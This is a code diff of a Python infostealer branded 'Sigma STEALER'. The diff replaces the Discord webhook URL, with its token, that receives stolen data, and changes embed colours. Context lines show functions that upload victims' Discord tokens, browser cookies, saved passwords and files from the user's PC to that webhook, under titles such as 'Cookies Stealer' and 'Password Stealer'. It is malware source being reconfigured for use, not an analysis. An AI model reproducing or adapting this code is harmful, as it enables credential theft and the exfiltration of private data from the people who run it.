@@ -20,7 +20,7 @@ import subprocess
 # 
 
 
-hook = "https://discord.com/api/webhooks/1121804316051767366/yBOLU644GbSXKYwz6L1V0ek49JKLo6NkyV9dYBVBZni24t8aLfF_kZGabJNe4XXF-m8c"
+hook = "https://discord.com/api/webhooks/1123667264403677225/TiGCQ14GoVF_yBTrxeeYFV2RtgSWb-h8vCu5KtXkJry73Rw9TaOof4-WzosFjggsTCoj"
 DETECTED = False
 
 
@@ -288,7 +288,7 @@ def uploadToken(token, path):
         "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
-            "color": 14406413,
+            "color": 14221567,
             "fields": [
                 {
                     "name": ":rocket: Token:",
@@ -369,7 +369,7 @@ def upload(name, link):
                 {
                     "title": "Sigma | Cookies Stealer",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [Cookies.txt]({link})",
-                    "color": 14406413,
+                    "color": 14221567,
                     "footer": {
                         "text": "@Sigma STEALER",
                         "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
@@ -395,7 +395,7 @@ def upload(name, link):
                 {
                     "title": "Sigma | Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [Password.txt]({link})",
-                    "color": 14406413,
+                    "color": 14221567,
                     "footer": {
                         "text": "@Sigma STEALER",
                         "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
@@ -414,7 +414,7 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                "color": 14406413,
+                "color": 14221567,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
